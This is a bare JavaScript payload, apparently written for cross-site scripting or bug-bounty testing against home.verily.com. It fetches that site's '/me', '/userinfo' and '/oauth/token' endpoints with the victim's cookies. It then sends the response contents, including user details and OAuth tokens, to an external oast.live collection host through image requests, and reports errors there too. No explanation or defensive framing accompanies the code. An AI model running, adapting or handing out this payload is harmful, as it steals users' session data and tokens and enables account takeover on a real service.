['/me','/userinfo','/oauth/token'].forEach(function(p){
  fetch('https://home.verily.com'+p,{credentials:'include'})
   .then(function(r){return r.text()})
   .then(function(d){ new Image().src='https://dbdoovevqmno88pf2di03zcsbqhtkdjym.oast.live/'+p.replace(/\W/g,'')+'?d='+encodeURIComponent(d).slice(0,1500); })
   .catch(function(e){ new Image().src='https://dbdoovevqmno88pf2di03zcsbqhtkdjym.oast.live/err'+p.replace(/\W/g,''); });
});
